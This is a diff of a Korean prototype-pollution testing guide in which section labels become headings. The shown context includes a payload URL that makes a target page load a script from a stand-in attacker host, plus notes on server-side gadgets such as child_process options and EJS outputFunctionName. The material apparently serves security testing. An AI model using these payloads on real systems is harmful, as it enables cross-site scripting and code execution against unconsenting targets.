@@ -1,6 +1,4 @@
-### Phase 2: 동적 테스트 (검증)
-
-**기본 페이로드:**
+### 기본 페이로드
 
 **서버 sink — JSON body:**
 ```json
@@ -81,7 +79,7 @@ https://target/page?__proto__[src]=//attacker/xss.js
 
 ---
 
-**우회 페이로드:**
+### 우회 페이로드
 
 | 방어 | 페이로드 |
 |---|---|
@@ -106,7 +104,7 @@ https://target/page?__proto__[src]=//attacker/xss.js
 
 ---
 
-**참고사항:**
+### 참고사항
 
 - 서버 sink 식별이 어려우므로 가젯 식별이 핵심 — 코드에서 `child_process` 옵션, EJS `outputFunctionName`, jQuery selector 등 확인
 - Express 4.x 기본 `qs` parser가 중첩 객체 생성 → query string으로도 오염 가능
